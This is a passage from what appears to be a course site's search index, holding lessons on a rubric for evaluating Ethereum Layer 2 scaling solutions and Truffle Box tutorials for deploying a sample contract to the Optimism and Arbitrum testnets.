less-technical approach to this same rubric, you can see the article below. Additional Material Article: For Questions to Judge Any Layer 2 Scaling Solution A less-technical, more general-audience article discussing the same paradigm outlined in this lesson Article: Evaluating Ethereum L2 Scaling Solutions: A Comparison Framework Another framework proposal from Matter Labs Article: Layer-2 for Beginners (Ali Atiia) Or How to Spot a Sidechain Charlatan and Keep Your Penny Safe","title":"Index"},{"location":"S08-scalability/M3-rubric/L1/#rubric-for-analyzing-scalability-solutions","text":"The challenge with understanding Layer 2 and scaling solutions is a common challenge for The explosion in demand for sophisticated, bleeding-edge cryptographic products leads to a common predicament in blockchain. For those not deeply familiar with these projects and their associated tech, it\u2019s extremely difficult\u2014if not intimidating\u2014to decide which is best and safest to use. Not to mention the rate of change of L2 documentation and the L2 frameworks themselves. However, there are trade-offs to using scalability solutions. Trade-offs to the blockchain primitives we discussed earlier in the course. With this section, we will continue propose a framework to assist the analysis of L2 projects. It\u2019s meant to help the reader develop an intuition for approaching a possible L2 solution for their various needs and circumstances. But it's also meant to highlight the trade-offs a scalability approach requires against our main blockchain network layer. This framework has eight assessment variables ( Operator , Data Availability , Computational Integrity , Economic Security , Stack Security , Capital Efficiency , Transaction Finality , and Programmability ). We use these assessment variables to score a project in three areas: Throughput , Security and Usability . See how the variables contribute to each area below: To be clear, these variables are not exhaustive. We haven\u2019t included network costs, users costs or the downstream network effects a Layer 2 inherits from the underlying Layer 1 blockchain. Again, the idea of the framework is not necessarily to be comprehensive but rather help develop an intuition for the benefits and trade-offs of different L2 solutions. Be sure to keep in mind the mental model around distributed consensus we learned earlier, it will come in handy. You can understand this lesson as a deeper development of the roles and features we discussed there.","title":"Rubric for Analyzing Scalability Solutions"},{"location":"S08-scalability/M3-rubric/L1/#l2-operator","text":"An Operator describes an actor within the L2 system responsible for executing state change within the L2 network. This includes facilitating entrances and exits to the L2 system as well as processing and authorizing transactions within the L2 system. Some considerations when analyzing an operator: - Is an Operator required in the L2 network? - Understanding Their Role: Who or what is the operator? What is the Operator responsible for? What is the motivation to become an Operator? - Trust Assumptions: Who can become an Operator? What power does an Operator have? What consensus rules do they abide by? What trust assumptions must users make about the Operator? - Risk Exposure: After answering the above questions, what risks do we need to consider? For example, how does the network respond when an Operator disappears, misbehaves. How does the system respond to L1 attacks or mass exit?","title":"L2 Operator"},{"location":"S08-scalability/M3-rubric/L1/#computational-integrity","text":"Computational Integrity (CI) is a key property of network security. CI seeks to ensure that the code for a given computation runs exactly as intended and therefore the state transition outputs are correct. Let\u2019s unpack this. The operation of each state advancement in a network can be simplified to: CI ensures that the data in the network is correct, because the code that advances the state of the network has run correctly and without manipulation by the operator actually performing the computation. It is enforced through two primary methods: Crypto-Economic Incentives This could take the form of incentivised consensus where the network can only advance if all network participants run and post the same computation resulting in a critical mass of agreement. It could also take the form of incentivised watchtowers where the network trusts third-parties to verify CI from operators and, in the case of misbehavior, trigger a network failsafe. Zero-Knowledge Cryptography Building mathematical assurances into the network\u2019s code execution model making integrity provable and verifiable","title":"Computational Integrity"},{"location":"S08-scalability/M3-rubric/L1/#data-availability","text":"This refers to the availability and immutability of intermediary state transition data. To go back to our state advancement of the network diagram: State transition data is a list of all intermediary state changes, alongside proof they are valid (e.g. aggregate signatures, ZKPs). Once a user\u2019s assets enter a L2, they are subject to the security properties of the L2, and therefore data availability is key to being able to verify that what happens to the user\u2019s assets within the L2 is valid and correct.","title":"Data Availability"},{"location":"S08-scalability/M3-rubric/L1/#economic-security","text":"Economic Security refers to the operational security that upholds the financial integrity of the L2 system. It can be rooted in two different areas: Inherited Economic Security from L1 This can be a strong inheritance where L2 assets are ultimately secured in contracts on L1 and L2 state transitions are checkpointed on L1. It can also be a weak inheritance, where L2 assets are ultimately secured on L1, but computational integrity and data availability are not secured by L1 Security Inherent to the Operator The characteristics of the L2 Operators may lend additional security, for example in Proof of Stake. Keep in mind, consensus methods such as Proof of Authority lend no inherent security beyond basic trust in the Operators.","title":"Economic Security"},{"location":"S08-scalability/M3-rubric/L1/#stack-security","text":"Stack Security is more of a passive security that comes from having a battle-hardened software stack. It includes aspects like: Shared Cryptographic Primitives Or primitives developed and hardened over decades of research and application. Compare this with newer cryptographic features that may not currently enjoy widespread adoption. For example, Elliptic Curve Cryptography versus newer ZKP methods. Shared Technology Stack Shared Investments into core technology stack and open-source network effects. Examples include the Go-Ethereum implementation, Solidity compiler and EVM runtime maintained by hundreds of contributors over time. Shared Ancillary Tooling Mature development environments and workflows, such as Truffle as well as security tooling, such as EVM bytecode formal verification, Solidity static analysis and fuzzers. Shared ecosystem and aligned security objectives The powerful network effects delivered by open-source development and the community that forms around it. Includes security gathered from audits, formal verification development, and institutional knowledge of attack vectors and history.","title":"Stack Security"},{"location":"S08-scalability/M3-rubric/L1/#capital-efficiency","text":"This refers to the cost and utility of capital held in an L2 network over time. L2 capital efficiency points that should be considered include: Capital must be locked into an L1 contract in order to move into the L2 Locking capital can come at high opportunity cost depending on the lockup times. Some systems require a lockup time of minutes, others require weeks. The real cost of capital can be discounted depending on the utility available within the network If the user can access great utility, the opportunity costs of lockup can be lower even if their capital is locked up. Fees for rapid exits, facilitated by liquidity providers (LPs), will be determined by real cost of capital. We'll discuss this more in our live session, \"Problems Still to Be Solved in Scalability.\"","title":"Capital Efficiency"},{"location":"S08-scalability/M3-rubric/L1/#transaction-finality","text":"Transaction finality on L1s is essentially full redeemability of assets. For L2s, there are multiple phases of finality: Operator finality, Checkpoint finality and L1 finality. The relationship of these three within a generic L2 is shown below: A user submitting a transaction within an L2 gets near-instantaneous finality when their transaction has been processed by an Operator. The user does not necessarily have to wait for L1 redeemability, rather they can use the Operator Finality as proof to exit via a Liquidity Provider. The Operator periodically submits a batch of L2 transactions and the subsequent state changes to L1. These submissions represent Checkpoint finality. The assets are not redeemable on L1 yet, but the data proving ownership of those assets are now on L1. This should give the user a much higher confidence in their assets\u2019 eventual redemption. At some point, the computational integrity of all those submitted L2 state transitions is verified on L1. Once that occurs, we have L1 finality and the user\u2019s assets are redeemable on L1.","title":"Transaction Finality"},{"location":"S08-scalability/M3-rubric/L1/#programmability","text":"Programmability at the L2 layer is important. Programmability is the key feature of Ethereum. Transactions become a canvas for innovation compared to the more limited execution environment like Bitcoin\u2019s Script. L2 projects that reuse the Ethereum stack benefit from the collective investment into security, developer tools, community support and knowledge of stack, languages, gotchas and failure modes. Zero-knowledge proof (ZKP)-powered L2s are forcing innovation in the programmability arena. ZKP execution environments have traditionally been limited in their capacity due to the nature of their circuits. New zk-circuit-friendly languages are emerging (Gnark, Cairo, Zinc) and bringing greater programmability; however, they require new virtual machines with little proven track record and nascent community support. Extending programmability at the L2 layer will provide an opportunity to experiment with low-level innovation and EIP protocol-level changes like account abstraction, native meta-transaction, and different computation models or runtimes.","title":"Programmability"},{"location":"S08-scalability/M3-rubric/L1/#conclusion","text":"This was a very technical discussion of the rubric for analyzing L2 or scalability solutions. We hope it gives you a sense of the trade-offs each solution provides. If you'd like a less-technical approach to this same rubric, you can see the article below.","title":"Conclusion"},{"location":"S08-scalability/M3-rubric/L1/#additional-material","text":"Article: For Questions to Judge Any Layer 2 Scaling Solution A less-technical, more general-audience article discussing the same paradigm outlined in this lesson Article: Evaluating Ethereum L2 Scaling Solutions: A Comparison Framework Another framework proposal from Matter Labs Article: Layer-2 for Beginners (Ali Atiia) Or How to Spot a Sidechain Charlatan and Keep Your Penny Safe","title":"Additional Material"},{"location":"S08-scalability/M4-examples/L1-optimism/","text":"Optimism Optimistic rollups are a great way to leverage all the tooling you've learned so far because they are generally compatible with the Ethereum Virtual Machine. In the next few lessons, we're going to walk through some examples of how to actually use this new technology. Again, we want to stress how new this technology is. You should be extremely cautious when working with it and be aware that documentation may not be up to date. Basic Mechanics To create a sandboxed environment which guarantees deterministic smart contract execution between L1 and L2, Optimism uses an Optimism Virtual Machine, which replaces context-dependent EVM opcodes with their OVM counterparts. See a complete comparison of the OVM vs EVM here. To accommodate this change, Optimism had to have their own compiler. They ended up forking solc and changed ~500 lines. Beware a potential gotcha: a contract compiled with the Optimism Solidity Compiler ends up bigger than it was, meaning that contracts near the 24KB limit must be refactored since they need to be executable on the mainnet as well as Optimism. Accounts on the Optimism Chain \"are redeployable contracts layer-2 contracts which can represent a user and provide a form of 'account abstraction'.\" ( source ) To put it all together, the Optimism Rollup chain: - Uses the OVM as its runtime/state transition function - Uses Optimistic Geth as the L2 client with single sequencer - Has solidity smart contracts deployed on Ethereum mainnet for data availability and dispute resolution/fraud proofs (you can read more about these \"bridge\" contracts here ) Top-level summary of how fraud proofs work: 1. Somebody will dispute a transaction if they disagree 2. They\u2019ll publish all related state on Ethereum including a Merkle proofs for each piece of state 3. They will re-execute the state transition on-chain 4. They will be rewarded for correctly disputing, the malicious sequencer will get slashed, and the invalid state roots will be pruned guaranteeing safety This is all implemented in Optimism\u2019s Fraud Prover service which is packaged with an optimistic-geth instance in a docker compose image. You can read more about the Transaction Challenge contracts here. Optimism Example We'll be walking through the Optimism Truffle Box to show you how to deploy our SimpleStorage smart contract from previous lessons to Optimism! After this example, you will be able to compile, migrate, and test Optimistic Solidity code against a variety of Optimism test networks. Requirements Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. You'll also need to setup an Optimism project from your Infura account. You don't have to update your account, right now access is being offered at the \"core\" level for free up to 100,000 daily requests. You must enable the Optimistic Ethereum ADD-ON under the billing section under Manage Add-Ons in your Infura account Settings for the API requests to work properly. When setting up your project, be sure to select the \"Ethereum\" network. Then, under settings, select the \"Optimism Kovan\" testnet, as shown below: You'll also need to have Kovan test ETH for the project if you'd like to run it on a public testnet. You can get some from the Kovan testnet faucet , the MyCrypto faucet , or Chainlink's faucet . Once you have Kovan ETH, you'll need to bridge it to Optimism. After getting Kovan ETH, follow these steps: Add Optimism Ethereum as a Custom RPC to your Metamask wallet, using the steps here, except set the RPC URL to https://optimism-kovan.infura.io/v3/\" + infuraKey Go to this site and bridge your Kovan ETH to Optimism Kovan ETH Ensure that your optimistic_kovan network in truffle-config.ovm.js is connected to your Optimism Kovan wallet. Note: You may get an error about your fee being too low when attempting to deploy to Optimistic Kovan. To bypass this error, you may need to increase the gas value in the optimistic_kovan network configuration in truffle-config.ovm.js to the value the error indicates. Gas price should be set at the transaction level, like so: { gasPrice: 15000000 } . Note, we'll also be building it locally so if you're having trouble finding Kovan ETH, you can start by running it locally. Let's get started! (For more detail, you can find the tutorial this lesson is based on here. ) Setup From a new directory, unbox the Optimism box: truffle unbox optimism You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GANACHE_MNEMONIC and a KOVAN_MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the optimism network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\" INFURA_KEY=\" \" GANACHE_MNEMONIC=\" \" KOVAN_MNEMONIC=\" \" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local Optimism Ethereum network we will run in this Truffle Box. As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env[' '] . Some Differences You may notice some differences in the workflow from our typical Truffle environment. For example, a new configuration file exists in this project: truffle-config.ovm.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Optimism contracts and lists several networks for running the Optimism Layer 2 network instance. Another difference: When you compile or migrate, the resulting json files will be at build/optimism-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference. Compiling The SimpleStorage.sol contract code is already in both the ethereum and optimism directories. To compile using the Optimism Virtual Machine compiler, run: npm run compile:ovm As we mentioned earlier, the OVM and EVM compiler are slightly different, so keep an eye out for any issues or errors. Migration Now that we've compiled the contract for Optimism, we can migrate it to an Optimism Layer 2 network. First, let's just try to our local Ganache, which will be almost similar to a normal Ethereum ganache instance: npm run migrate:ovm --network=ganache This may be a bit underwhelming! However, if we have loaded in our Infura Optimism Kovan network endpoint and have enough Optimism Kovan eth in the wallet tied to the .env mnemonic, we can also run: npm run migrate:ovm --network=optimistic_kovan Please note: as of early September, the Optimism box is having issues with gas prices on Kovan network. Local or Mainnet Optimism deployment may be better. Like standard Truffle, if you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.ovm.js --network=(ganache | optimistic_ethereum | optimistic_kovan) and add the --reset flag. Following the above steps should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 Ethereum using Layer 2 Optimism, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Optimism ecosystem. Furthermore, keep an eye out for new developments in Truffle tooling to assist with bridging L1-L2 data and execution. Please note that, at this moment, Optimism has a whitelist of applications that are allowed to go from Optimism to Ethereum mainnet. You can learn more about that here. Additional Material Optimism website Docs: Optimism Great documentation for different audiences, whether you want to learn about the infrastructure or deploy dapps. Tutorial: Optimism Beginner Tutorial Docs: Whitelisting on Optimism","title":"Optimism"},{"location":"S08-scalability/M4-examples/L1-optimism/#optimism","text":"Optimistic rollups are a great way to leverage all the tooling you've learned so far because they are generally compatible with the Ethereum Virtual Machine. In the next few lessons, we're going to walk through some examples of how to actually use this new technology. Again, we want to stress how new this technology is. You should be extremely cautious when working with it and be aware that documentation may not be up to date.","title":"Optimism"},{"location":"S08-scalability/M4-examples/L1-optimism/#basic-mechanics","text":"To create a sandboxed environment which guarantees deterministic smart contract execution between L1 and L2, Optimism uses an Optimism Virtual Machine, which replaces context-dependent EVM opcodes with their OVM counterparts. See a complete comparison of the OVM vs EVM here. To accommodate this change, Optimism had to have their own compiler. They ended up forking solc and changed ~500 lines. Beware a potential gotcha: a contract compiled with the Optimism Solidity Compiler ends up bigger than it was, meaning that contracts near the 24KB limit must be refactored since they need to be executable on the mainnet as well as Optimism. Accounts on the Optimism Chain \"are redeployable contracts layer-2 contracts which can represent a user and provide a form of 'account abstraction'.\" ( source ) To put it all together, the Optimism Rollup chain: - Uses the OVM as its runtime/state transition function - Uses Optimistic Geth as the L2 client with single sequencer - Has solidity smart contracts deployed on Ethereum mainnet for data availability and dispute resolution/fraud proofs (you can read more about these \"bridge\" contracts here ) Top-level summary of how fraud proofs work: 1. Somebody will dispute a transaction if they disagree 2. They\u2019ll publish all related state on Ethereum including a Merkle proofs for each piece of state 3. They will re-execute the state transition on-chain 4. They will be rewarded for correctly disputing, the malicious sequencer will get slashed, and the invalid state roots will be pruned guaranteeing safety This is all implemented in Optimism\u2019s Fraud Prover service which is packaged with an optimistic-geth instance in a docker compose image. You can read more about the Transaction Challenge contracts here.","title":"Basic Mechanics"},{"location":"S08-scalability/M4-examples/L1-optimism/#optimism-example","text":"We'll be walking through the Optimism Truffle Box to show you how to deploy our SimpleStorage smart contract from previous lessons to Optimism! After this example, you will be able to compile, migrate, and test Optimistic Solidity code against a variety of Optimism test networks.","title":"Optimism Example"},{"location":"S08-scalability/M4-examples/L1-optimism/#requirements","text":"Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. You'll also need to setup an Optimism project from your Infura account. You don't have to update your account, right now access is being offered at the \"core\" level for free up to 100,000 daily requests. You must enable the Optimistic Ethereum ADD-ON under the billing section under Manage Add-Ons in your Infura account Settings for the API requests to work properly. When setting up your project, be sure to select the \"Ethereum\" network. Then, under settings, select the \"Optimism Kovan\" testnet, as shown below: You'll also need to have Kovan test ETH for the project if you'd like to run it on a public testnet. You can get some from the Kovan testnet faucet , the MyCrypto faucet , or Chainlink's faucet . Once you have Kovan ETH, you'll need to bridge it to Optimism. After getting Kovan ETH, follow these steps: Add Optimism Ethereum as a Custom RPC to your Metamask wallet, using the steps here, except set the RPC URL to https://optimism-kovan.infura.io/v3/\" + infuraKey Go to this site and bridge your Kovan ETH to Optimism Kovan ETH Ensure that your optimistic_kovan network in truffle-config.ovm.js is connected to your Optimism Kovan wallet. Note: You may get an error about your fee being too low when attempting to deploy to Optimistic Kovan. To bypass this error, you may need to increase the gas value in the optimistic_kovan network configuration in truffle-config.ovm.js to the value the error indicates. Gas price should be set at the transaction level, like so: { gasPrice: 15000000 } . Note, we'll also be building it locally so if you're having trouble finding Kovan ETH, you can start by running it locally. Let's get started! (For more detail, you can find the tutorial this lesson is based on here. )","title":"Requirements"},{"location":"S08-scalability/M4-examples/L1-optimism/#setup","text":"From a new directory, unbox the Optimism box: truffle unbox optimism You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.ovm.js file expects a GANACHE_MNEMONIC and a KOVAN_MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the optimism network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"candy maple cake sugar pudding cream honey rich smooth crumble sweet treat\" INFURA_KEY=\" \" GANACHE_MNEMONIC=\" \" KOVAN_MNEMONIC=\" \" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local Optimism Ethereum network we will run in this Truffle Box. As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env[' '] .","title":"Setup"},{"location":"S08-scalability/M4-examples/L1-optimism/#some-differences","text":"You may notice some differences in the workflow from our typical Truffle environment. For example, a new configuration file exists in this project: truffle-config.ovm.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Optimism contracts and lists several networks for running the Optimism Layer 2 network instance. Another difference: When you compile or migrate, the resulting json files will be at build/optimism-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference.","title":"Some Differences"},{"location":"S08-scalability/M4-examples/L1-optimism/#compiling","text":"The SimpleStorage.sol contract code is already in both the ethereum and optimism directories. To compile using the Optimism Virtual Machine compiler, run: npm run compile:ovm As we mentioned earlier, the OVM and EVM compiler are slightly different, so keep an eye out for any issues or errors.","title":"Compiling"},{"location":"S08-scalability/M4-examples/L1-optimism/#migration","text":"Now that we've compiled the contract for Optimism, we can migrate it to an Optimism Layer 2 network. First, let's just try to our local Ganache, which will be almost similar to a normal Ethereum ganache instance: npm run migrate:ovm --network=ganache This may be a bit underwhelming! However, if we have loaded in our Infura Optimism Kovan network endpoint and have enough Optimism Kovan eth in the wallet tied to the .env mnemonic, we can also run: npm run migrate:ovm --network=optimistic_kovan Please note: as of early September, the Optimism box is having issues with gas prices on Kovan network. Local or Mainnet Optimism deployment may be better. Like standard Truffle, if you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.ovm.js --network=(ganache | optimistic_ethereum | optimistic_kovan) and add the --reset flag. Following the above steps should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 Ethereum using Layer 2 Optimism, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Optimism ecosystem. Furthermore, keep an eye out for new developments in Truffle tooling to assist with bridging L1-L2 data and execution. Please note that, at this moment, Optimism has a whitelist of applications that are allowed to go from Optimism to Ethereum mainnet. You can learn more about that here.","title":"Migration"},{"location":"S08-scalability/M4-examples/L1-optimism/#additional-material","text":"Optimism website Docs: Optimism Great documentation for different audiences, whether you want to learn about the infrastructure or deploy dapps. Tutorial: Optimism Beginner Tutorial Docs: Whitelisting on Optimism","title":"Additional Material"},{"location":"S08-scalability/M4-examples/L2-arbitrum/","text":"Arbitrum Example In this lesson, we're going to walkthrough setting up a development environment for the optimistic rollup protocol Arbitrum, built by Offchain Labs. As we've discussed before, optimistic rollups offer an easier path to scaling in certain situations since they leverage much of the same toolkit as EVM development. Out of the box, Arbitrum supports Solidity as well as Truffle, Hardhat, The Graph, etc. You can see the differences between Ethereum and Arbitrum here. Like Optimism, Arbitrum's consensus layer is a dispute-based one, called a Multi-Round Interactive Optimistic Rollup protocol. Anyone can monitor or submit disputes on the Arbitrum chain, Read more about the protocol here and how to run a validator here. As of now, Arbitrum has limited functionality in terms of porting assets from L1 >> L2 and vice versa. See its capabilities in the tutorials listed here. Again, we want to stress how new this technology is. You should be extremely cautious when working with it and be aware that documentation may not be up to date. The requirements and setup for Arbitrum are very similar to the previous lesson on Optimism, except that Arbitrum's testnet is running on Rinkeby while Optimism's is on Kovan. We'll also be using our SimpleStorage.sol contract as a generic stand-in for your dapp's contract. Feel free to swap it out! Requirements Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. You'll also need to setup an Arbitrum project on your Infura account. You don't have to update your account, right now access is being offered at the \"core\" level for free up to 100,000 daily requests. You must enable the Arbitrum Rollup ADD-ON under the billing section under Manage Add-Ons in your Infura account Settings for the API requests to work properly. When setting up your project, be sure to select the \"Ethereum\" network. Then, under settings, select the \"Arbitrum Rinkeby\" testnet, as shown below: You'll also need to have Rinkeby test-ETH for the project if you'd like to run it on a public testnet. Follow the steps on the Rinkeby testnet faucet here to get some. Once you have Rinkeby test-ETH, you'll need to bridge it to Arbitrum testnet. Follow these steps: Add Arbitrum Ethereum as a Custom RPC to your Metamask wallet, using the steps here, except set the RPC URL to https://arbitrum-rinkeby.infura.io/v3/\" + infuraKey Go to this site and bridge your Rinkeby ETH to Arbitrum Rinkeby ETH Ensure that your arbitrum_testnet network in truffle-config.arbitrum.js is the mnemonic associated with your Arbitrum Rinkeby MetaMask wallet we just bridged. Let's get started! (For more detail, you can find the tutorial this lesson is based on here. ) Setup From a new directory, unbox the Arbitrum box: truffle unbox arbitrum You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.arbitrum.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"jar deny prosper gasp flush glass core corn alarm treat leg smart\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Arbitrum Mainnet Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local arbitrum network we will run in this Truffle Box. As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] . Some Differences You may notice some differences in the workflow from our typical Truffle environment. For example,a new configuration file exists in this project: truffle-config.arbitrum.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Arbitrum contracts and lists several networks for running the Arbitrum Layer 2 network instance. Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder. Another difference: When you compile or migrate, the resulting json files will be at build/arbitrum-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference. Compiling To compile your Arbitrum contracts, run the following in your terminal: npm run compile:arbitrum This script lets Truffle know to use the truffle-config.arbitrum.js configuration file, which tells Truffle where to store your build artifacts. When adding new contracts to compile, you may find some discrepancies and errors, so please remember to keep an eye on differences between ethereum and Arbitrum . Migration Now that we've compiled the contract for Arbitrum, we can migrate it to an Arbitrum Layer 2 network. First, let's just try to our local Ganache, which will be almost similar to a normal Ethereum ganache instance: npm run migrate:arbitrum --network=ganache This may be a bit underwhelming! However, if we have loaded in our Infura Arbitrum Rinkeby network endpoint and have enough Arbitrum Rinkeby ETH in the wallet tied to the .env mnemonic, we can also run: npm run migrate:arbitrum --network=arbitrum_testnet Like standard Truffle, if you would like to migrate previously migrated contracts on the same network, you can run truffle migrate --config truffle-config.arbitrum.js --network=(arbitrum_local | arbitrum_testnet | arbitrum_mainnet) and add the --reset flag. Following the above steps should allow you to deploy to the Optimism Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on Layer 1 Ethereum using Layer 2 Arbitrum, you will need to be aware of the ways in which Layer 1 and Layer 2 interact in the Arbitrum ecosystem. Furthermore, keep an eye out for new developments in Truffle tooling to assist with bridging L1-L2 data and execution. Additional Material Docs: Arbitrum Quickstart Tutorial: Truffle's Pet Shop Box on Arbitrum","title":"Arbitrum Example"},{"location":"S08-scalability/M4-examples/L2-arbitrum/#arbitrum-example","text":"In this lesson, we're going to walkthrough setting up a development environment for the optimistic rollup protocol Arbitrum, built by Offchain Labs. As we've discussed before, optimistic rollups offer an easier path to scaling in certain situations since they leverage much of the same toolkit as EVM development. Out of the box, Arbitrum supports Solidity as well as Truffle, Hardhat, The Graph, etc. You can see the differences between Ethereum and Arbitrum here. Like Optimism, Arbitrum's consensus layer is a dispute-based one, called a Multi-Round Interactive Optimistic Rollup protocol. Anyone can monitor or submit disputes on the Arbitrum chain, Read more about the protocol here and how to run a validator here. As of now, Arbitrum has limited functionality in terms of porting assets from L1 >> L2 and vice versa. See its capabilities in the tutorials listed here. Again, we want to stress how new this technology is. You should be extremely cautious when working with it and be aware that documentation may not be up to date. The requirements and setup for Arbitrum are very similar to the previous lesson on Optimism, except that Arbitrum's testnet is running on Rinkeby while Optimism's is on Kovan. We'll also be using our SimpleStorage.sol contract as a generic stand-in for your dapp's contract. Feel free to swap it out!","title":"Arbitrum Example"},{"location":"S08-scalability/M4-examples/L2-arbitrum/#requirements","text":"Node.js 10.x or later NPM version 5.2 or later docker , version 19.03.12 or later docker-compose , version 1.27.3 or later Recommended Docker memory allocation of >=8 GB. You'll also need to setup an Arbitrum project on your Infura account. You don't have to update your account, right now access is being offered at the \"core\" level for free up to 100,000 daily requests. You must enable the Arbitrum Rollup ADD-ON under the billing section under Manage Add-Ons in your Infura account Settings for the API requests to work properly. When setting up your project, be sure to select the \"Ethereum\" network. Then, under settings, select the \"Arbitrum Rinkeby\" testnet, as shown below: You'll also need to have Rinkeby test-ETH for the project if you'd like to run it on a public testnet. Follow the steps on the Rinkeby testnet faucet here to get some. Once you have Rinkeby test-ETH, you'll need to bridge it to Arbitrum testnet. Follow these steps: Add Arbitrum Ethereum as a Custom RPC to your Metamask wallet, using the steps here, except set the RPC URL to https://arbitrum-rinkeby.infura.io/v3/\" + infuraKey Go to this site and bridge your Rinkeby ETH to Arbitrum Rinkeby ETH Ensure that your arbitrum_testnet network in truffle-config.arbitrum.js is the mnemonic associated with your Arbitrum Rinkeby MetaMask wallet we just bridged. Let's get started! (For more detail, you can find the tutorial this lesson is based on here. )","title":"Requirements"},{"location":"S08-scalability/M4-examples/L2-arbitrum/#setup","text":"From a new directory, unbox the Arbitrum box: truffle unbox arbitrum You will need at least one mnemonic to use with the network. The .dotenv npm package has been installed for you, and you will need to create a .env file for storing your mnemonic and any other needed private information. The .env file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The truffle-config.arbitrum.js file expects a MNEMONIC value to exist in .env for running commands on each of these networks, as well as a default MNEMONIC for the Arbitrum network we will run locally. If you are unfamiliar with using .env for managing your mnemonics and other keys, the basic steps for doing so are below: Use touch .env in the command line to create a .env file at the root of your project. Open the .env file in your preferred IDE Add the following, filling in your own Infura project key and mnemonics: MNEMONIC=\"jar deny prosper gasp flush glass core corn alarm treat leg smart\" INFURA_KEY=\"<Your Infura Project ID>\" RINKEBY_MNEMONIC=\"<Your Rinkeby Mnemonic>\" MAINNET_MNEMONIC=\"<Your Arbitrum Mainnet Mnemonic>\" Note: the value for the MNEMONIC above is the one you should use, as it is expected within the local arbitrum network we will run in this Truffle Box. As you develop your project, you can put any other sensitive information in this file. You can access it from other files with require('dotenv').config() and refer to the variable you need with process.env['<YOUR_VARIABLE>'] .","title":"Setup"},{"location":"S08-scalability/M4-examples/L2-arbitrum/#some-differences","text":"You may notice some differences in the workflow from our typical Truffle environment. For example,a new configuration file exists in this project: truffle-config.arbitrum.js . This file contains a reference to the new file location of the contracts_build_directory and contracts_directory for Arbitrum contracts and lists several networks for running the Arbitrum Layer 2 network instance. Please note, the classic truffle-config.js configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands ( truffle compile , truffle migrate , etc.) will use this config file and save built files to build/ethereum-contracts . You can save Solidity contracts that you wish to deploy to Ethereum in the contracts/ethereum folder. Another difference: When you compile or migrate, the resulting json files will be at build/arbitrum-contracts/ . This is to distinguish them from any Ethereum contracts you build, which will live in build/ethereum-contracts . As we have included the appropriate contracts_build_directory in each configuration file, Truffle will know which set of built files to reference.","title":"Some Differences"},{"location":"S08-scalability/M4-examples/L2-arbitrum/#compiling","text":"To compile your Arbitrum contracts, run the following in your terminal: npm run compile:arbitrum This script lets Truffle know to use the truffle-config.arbitrum.js configuration file, which tells 